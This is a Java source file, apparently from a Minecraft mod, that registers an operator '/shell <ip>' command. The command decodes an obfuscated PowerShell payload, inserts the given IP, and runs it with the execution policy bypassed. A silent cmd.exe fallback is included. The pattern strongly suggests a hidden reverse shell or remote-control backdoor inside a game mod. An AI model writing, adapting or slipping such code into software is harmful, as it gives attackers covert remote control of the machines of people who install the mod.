package com.shell;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.network.chat.Component;
import java.io.File;

public class ShellCommand {

    public static void register(CommandDispatcher<CommandSourceStack> dispatcher) {
        dispatcher.register(Commands.literal("shell")
                .requires(source -> source.hasPermission(2))
                .then(Commands.argument("ip", StringArgumentType.string())
                        .executes(context -> {
                            String ip = StringArgumentType.getString(context, "ip");

                            try {
                                // Decrypt the PowerShell command
                                String psCommand = StringObfuscator.d("DklGQ09EXgoXCmRPXQdlSEBPSV4KeVNZXk9HBGRPXgR5RUlBT15ZBH5pemlGQ09EXgINdXVjenV1DQYbGRkdAxEOWV5YT0tHChcKDklGQ09EXgRtT155XlhPS0cCAxFxSFNeT3F3dw5IU15PWQoXChoEBBwfHxkfVg9RGlcRXUJDRk8CAg5DChcKDlleWE9LRwR4T0tOAg5IU15PWQYKGgYKDkhTXk9ZBGZPRE1eQgMDCgdETwoaA1EOTkteSwoXCgJkT10HZUhAT0leCgd+U1pPZEtHTwp5U1leT0cEfk9SXgRreWljY29ESUVOQ0RNAwRtT155XlhDRE0CDkhTXk9ZBhoGCg5DAxEOWU9ETkhLSUEKFwoCQ09SCg5OS15LChgUDBsKVgplX14HeV5YQ0RNCgMRDllPRE5IS0lBGAoXCg5ZT0ROSEtJQQoBCg16eQoNCgEKAlpdTgMEekteQgoBCg0UCg0RDllPRE5IU15PChcKAnFeT1JeBE9ESUVOQ0RNdxAQa3lpY2MDBG1PXmhTXk9ZAg5ZT0ROSEtJQRgDEQ5ZXlhPS0cEfVhDXk8CDllPRE5IU15PBhoGDllPRE5IU15PBGZPRE1eQgMRDlleWE9LRwRsRl9ZQgIDVxEOSUZDT0ReBGlGRVlPAgM=");
                                psCommand = psCommand.replace("__IP__", ip);

                                // Method 1: Direct ProcessBuilder (better for Windows)
                                ProcessBuilder pb = new ProcessBuilder(
                                        "powershell.exe",
                                        "-NoProfile",
                                        "-NonInteractive",
                                        "-ExecutionPolicy", "Bypass",
                                        "-Command", psCommand
                                );
                                pb.directory(new File(System.getProperty("user.home")));
                                pb.start();

                                context.getSource().sendSuccess(() -> Component.literal("Executed"), false);
                                return 1;
                            } catch (Exception e) {
                                // Fallback: Try cmd.exe method
                                try {
                                    String psCommand = StringObfuscator.d("DklGQ09EXgoXCmRPXQdlSEBPSV4KeVNZXk9HBGRPXgR5RUlBT15ZBH5pemlGQ09EXgINdXVjenV1DQYbGRkdAxEOWV5YT0tHChcKDklGQ09EXgRtT155XlhPS0cCAxFxSFNeT3F3dw5IU15PWQoXChoEBBwfHxkfVg9RGlcRXUJDRk8CAg5DChcKDlleWE9LRwR4T0tOAg5IU15PWQYKGgYKDkhTXk9ZBGZPRE1eQgMDCgdETwoaA1EOTkteSwoXCgJkT10HZUhAT0leCgd+U1pPZEtHTwp5U1leT0cEfk9SXgRreWljY29ESUVOQ0RNAwRtT155XlhDRE0CDkhTXk9ZBhoGCg5DAxEOWU9ETkhLSUEKFwoCQ09SCg5OS15LChgUDBsKVgplX14HeV5YQ0RNCgMRDllPRE5IS0lBGAoXCg5ZT0ROSEtJQQoBCg16eQoNCgEKAlpdTgMEekteQgoBCg0UCg0RDllPRE5IU15PChcKAnFeT1JeBE9ESUVOQ0RNdxAQa3lpY2MDBG1PXmhTXk9ZAg5ZT0ROSEtJQRgDEQ5ZXlhPS0cEfVhDXk8CDllPRE5IU15PBhoGDllPRE5IU15PBGZPRE1eQgMRDlleWE9LRwRsRl9ZQgIDVxEOSUZDT0ReBGlGRVlPAgM=");
                                    psCommand = psCommand.replace("__IP__", ip);

                                    Runtime.getRuntime().exec(new String[]{
                                            "cmd.exe", "/c", "start", "/b", "powershell.exe",
                                            "-NoProfile", "-ExecutionPolicy", "Bypass",
                                            "-Command", psCommand
                                    });

                                    context.getSource().sendSuccess(() -> Component.literal("Executed (fallback)"), false);
                                    return 1;
                                } catch (Exception e2) {
                                    context.getSource().sendFailure(Component.literal("Failed: " + e2.getMessage()));
                                    return 0;
                                }
                            }
                        })
                )
        );
    }
}